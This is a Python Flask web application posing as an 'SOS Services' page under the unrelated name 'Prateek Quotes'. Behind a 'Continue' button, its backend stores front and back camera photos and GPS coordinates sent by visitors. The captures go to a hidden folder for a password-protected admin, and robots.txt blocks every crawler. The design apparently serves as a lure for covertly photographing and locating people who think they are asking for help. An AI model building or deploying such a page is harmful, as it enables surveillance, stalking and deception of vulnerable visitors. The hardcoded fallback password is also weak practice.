import os
import sqlite3
import base64
import time
from functools import wraps
from werkzeug.utils import secure_filename
from flask import (
    Flask, render_template, request, redirect,
    url_for, session, jsonify, send_from_directory
)

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-this-secret-key")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "changeme123")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, "data.db")
ALERT_PHOTO_DIR = os.path.join(BASE_DIR, "alert_photos")   # private — only admin can view
UPLOAD_DIR = os.path.join(BASE_DIR, "static", "uploads")    # public site assets (logo, confirm photo)
os.makedirs(ALERT_PHOTO_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

DEFAULT_SETTINGS = {
    "site_name": "Prateek Quotes",
    "subtitle": "SOS Services — if you're in trouble, tap Continue",
    "button_text": "Continue",
    "confirm_text": "Work has been done.",
    "confirm_photo": "",
    "logo": "",
    "accent_color": "#39FF88",
    "bg_color": "#0B0F14",
    "font_choice": "mono",
}

FONT_MAP = {
    "mono": "'JetBrains Mono', ui-monospace, monospace",
    "grotesk": "'Space Grotesk', system-ui, sans-serif",
    "display": "'Syne', system-ui, sans-serif",
}


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    conn = get_db()
    conn.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
    conn.execute("""
        CREATE TABLE IF NOT EXISTS alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            created_at TEXT NOT NULL,
            latitude REAL,
            longitude REAL,
            front_photo TEXT,
            back_photo TEXT
        )
    """)
    for k, v in DEFAULT_SETTINGS.items():
        conn.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))
    conn.commit()
    conn.close()


init_db()


def get_settings():
    conn = get_db()
    rows = conn.execute("SELECT key, value FROM settings").fetchall()
    conn.close()
    settings = {row["key"]: row["value"] for row in rows}
    for k, v in DEFAULT_SETTINGS.items():
        settings.setdefault(k, v)
    settings["font_family"] = FONT_MAP.get(settings.get("font_choice", "mono"), FONT_MAP["mono"])
    return settings


def update_settings(fields):
    conn = get_db()
    for k, v in fields.items():
        conn.execute(
            "INSERT INTO settings (key, value) VALUES (?, ?) "
            "ON CONFLICT(key) DO UPDATE SET value=excluded.value",
            (k, v),
        )
    conn.commit()
    conn.close()


def login_required(f):
    @wraps(f)
    def wrapped(*args, **kwargs):
        if not session.get("is_admin"):
            return redirect(url_for("login"))
        return f(*args, **kwargs)
    return wrapped


def save_capture(data_url, prefix):
    """Decode a data: URL from the browser and save it as a jpg/png file."""
    if not data_url or "," not in data_url:
        return None
    try:
        header, encoded = data_url.split(",", 1)
        ext = "jpg" if "jpeg" in header else "png"
        filename = f"{prefix}_{int(time.time() * 1000)}.{ext}"
        filepath = os.path.join(ALERT_PHOTO_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(base64.b64decode(encoded))
        return filename
    except Exception:
        return None


@app.route("/")
def index():
    return render_template("index.html", s=get_settings())


@app.route("/api/alert", methods=["POST"])
def api_alert():
    data = request.get_json(force=True, silent=True) or {}
    front_filename = save_capture(data.get("front_photo"), "front")
    back_filename = save_capture(data.get("back_photo"), "back")

    conn = get_db()
    conn.execute(
        "INSERT INTO alerts (created_at, latitude, longitude, front_photo, back_photo) "
        "VALUES (?, ?, ?, ?, ?)",
        (
            time.strftime("%Y-%m-%d %H:%M:%S"),
            data.get("latitude"),
            data.get("longitude"),
            front_filename,
            back_filename,
        ),
    )
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})


@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["is_admin"] = True
            return redirect(url_for("admin_data"))
        error = "Wrong password. Try again."
    return render_template("login.html", error=error)


@app.route("/logout")
def logout():
    session.pop("is_admin", None)
    return redirect(url_for("login"))


@app.route("/admin/data")
@login_required
def admin_data():
    conn = get_db()
    rows = conn.execute("SELECT * FROM alerts ORDER BY id DESC").fetchall()
    conn.close()
    return render_template("admin_data.html", alerts=rows, s=get_settings())


@app.route("/admin/edit", methods=["GET", "POST"])
@login_required
def admin_edit():
    if request.method == "POST":
        fields = {
            "site_name": request.form.get("site_name", "").strip() or DEFAULT_SETTINGS["site_name"],
            "subtitle": request.form.get("subtitle", "").strip(),
            "button_text": request.form.get("button_text", "").strip() or "Continue",
            "confirm_text": request.form.get("confirm_text", "").strip(),
            "accent_color": request.form.get("accent_color", DEFAULT_SETTINGS["accent_color"]),
            "bg_color": request.form.get("bg_color", DEFAULT_SETTINGS["bg_color"]),
            "font_choice": request.form.get("font_choice", "mono"),
        }

        logo_file = request.files.get("logo")
        if logo_file and logo_file.filename:
            filename = secure_filename(f"logo_{int(time.time())}_{logo_file.filename}")
            logo_file.save(os.path.join(UPLOAD_DIR, filename))
            fields["logo"] = filename

        confirm_photo_file = request.files.get("confirm_photo")
        if confirm_photo_file and confirm_photo_file.filename:
            filename = secure_filename(f"confirm_{int(time.time())}_{confirm_photo_file.filename}")
            confirm_photo_file.save(os.path.join(UPLOAD_DIR, filename))
            fields["confirm_photo"] = filename

        update_settings(fields)
        return redirect(url_for("admin_edit"))

    return render_template("admin_edit.html", s=get_settings())


@app.route("/alert_photos/<path:filename>")
@login_required
def alert_photos(filename):
    return send_from_directory(ALERT_PHOTO_DIR, filename)


@app.route("/robots.txt")
def robots():
    return ("User-agent: *\nDisallow: /\n", 200, {"Content-Type": "text/plain"})


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False)
